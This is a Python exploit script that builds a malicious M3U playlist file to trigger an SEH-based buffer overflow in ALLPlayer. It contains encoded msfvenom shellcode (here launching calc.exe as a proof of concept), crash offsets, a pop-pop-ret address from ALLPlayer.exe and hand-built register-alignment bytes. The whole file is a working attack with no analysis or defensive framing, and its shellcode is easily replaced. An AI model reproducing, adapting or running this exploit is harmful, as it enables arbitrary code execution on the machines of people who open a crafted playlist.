import sys

filename = "allplayer_sploit.m3u"

# Maximum length
maxlen = 5000

# msfvenom -p windows/exec cmd=calc.exe -e x86/unicode_mixed -f python -b "\x00\x0a\x0d" -v shellcode bufferregister=eax
# Payload size: 512 bytes
shellcode =  ""
shellcode += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
shellcode += "\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
shellcode += "\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
shellcode += "\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
shellcode += "\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
shellcode += "\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
shellcode += "\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
shellcode += "\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
shellcode += "\x75\x34\x4a\x42\x39\x6c\x59\x58\x65\x32\x39\x70"
shellcode += "\x6d\x30\x59\x70\x31\x50\x61\x79\x4b\x35\x4c\x71"
shellcode += "\x49\x30\x52\x44\x62\x6b\x32\x30\x4c\x70\x72\x6b"
shellcode += "\x32\x32\x4c\x4c\x32\x6b\x42\x32\x6e\x34\x64\x4b"
shellcode += "\x50\x72\x6c\x68\x6a\x6f\x56\x57\x30\x4a\x6e\x46"
shellcode += "\x4e\x51\x59\x6f\x76\x4c\x6f\x4c\x33\x31\x71\x6c"
shellcode += "\x4d\x32\x4e\x4c\x6f\x30\x66\x61\x56\x6f\x6c\x4d"
shellcode += "\x39\x71\x78\x47\x5a\x42\x5a\x52\x62\x32\x6f\x67"
shellcode += "\x54\x4b\x30\x52\x4e\x30\x72\x6b\x4e\x6a\x6f\x4c"
shellcode += "\x32\x6b\x30\x4c\x5a\x71\x33\x48\x59\x53\x70\x48"
shellcode += "\x4b\x51\x78\x51\x4e\x71\x34\x4b\x31\x49\x4b\x70"
shellcode += "\x7a\x61\x4a\x33\x52\x6b\x6d\x79\x6d\x48\x67\x73"
shellcode += "\x4f\x4a\x70\x49\x42\x6b\x4e\x54\x34\x4b\x69\x71"
shellcode += "\x46\x76\x4d\x61\x79\x6f\x36\x4c\x47\x51\x38\x4f"
shellcode += "\x7a\x6d\x69\x71\x75\x77\x6e\x58\x47\x70\x33\x45"
shellcode += "\x6a\x56\x4d\x33\x33\x4d\x4a\x58\x6f\x4b\x51\x6d"
shellcode += "\x6c\x64\x71\x65\x7a\x44\x72\x38\x44\x4b\x72\x38"
shellcode += "\x4d\x54\x4a\x61\x7a\x33\x31\x56\x52\x6b\x6c\x4c"
shellcode += "\x6e\x6b\x62\x6b\x52\x38\x4d\x4c\x79\x71\x58\x53"
shellcode += "\x64\x4b\x6d\x34\x74\x4b\x5a\x61\x38\x50\x64\x49"
shellcode += "\x50\x44\x4f\x34\x6d\x54\x61\x4b\x4f\x6b\x53\x31"
shellcode += "\x71\x49\x31\x4a\x72\x31\x39\x6f\x79\x50\x51\x4f"
shellcode += "\x61\x4f\x50\x5a\x72\x6b\x6d\x42\x6a\x4b\x54\x4d"
shellcode += "\x61\x4d\x32\x4a\x39\x71\x62\x6d\x74\x45\x38\x32"
shellcode += "\x59\x70\x4b\x50\x4d\x30\x32\x30\x43\x38\x70\x31"
shellcode += "\x62\x6b\x32\x4f\x73\x57\x79\x6f\x69\x45\x55\x6b"
shellcode += "\x48\x70\x78\x35\x57\x32\x50\x56\x33\x38\x67\x36"
shellcode += "\x36\x35\x47\x4d\x65\x4d\x59\x6f\x56\x75\x6f\x4c"
shellcode += "\x49\x76\x73\x4c\x6a\x6a\x51\x70\x6b\x4b\x57\x70"
shellcode += "\x43\x45\x6a\x65\x55\x6b\x50\x47\x5a\x73\x72\x52"
shellcode += "\x62\x4f\x31\x5a\x39\x70\x70\x53\x69\x6f\x36\x75"
shellcode += "\x42\x43\x73\x31\x50\x6c\x71\x53\x4e\x4e\x30\x65"
shellcode += "\x32\x58\x32\x45\x6d\x30\x41\x41"

# Offsets
crash_nseh = 303
crash_seh = crash_nseh + 2

# Aligning ESP with buffer
# EBP = 0012e578, Buffer EIP = 0012ed3b: EIP - EBP = 0x07c3
align_ebp = (   
                "\x45"              # Padding
                "\x55"              # PUSH EBP
                "\x45"              # Padding
                "\x58"              # POP EAX
                "\x45"              # Padding
                "\x05\x09\x11"      # "\x05\x00\x09\x00\x11" # 0500b00011 add eax,0x11000900 --\
                "\x45"              # Padding                                                   |--> Adds 0x800 bytes
                "\x2d\x01\x11"      # "\x2d\x00\x01\x00\x11" # 2d00020011 sub eax,0x11000100 --/
                "\x45"              # Padding
                "\x50"              # PUSH EAX
                "\x45"              # Padding
                "\xc3"              # RET
)

# Prefix
prefix = "http://"
prefix += "A" * crash_nseh
nseh = "\x42\x45"
seh = "\xb0\x56"                                        # 0x005600b0 : pop ecx # pop ebp # ret [ALLPlayer.exe]
suffix = align_ebp
suffix += "\x45" * 14                                   # Padding
suffix += shellcode
suffix += "D" * (maxlen - len(prefix + nseh + seh))

# Payload
payload = prefix + nseh + seh + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()

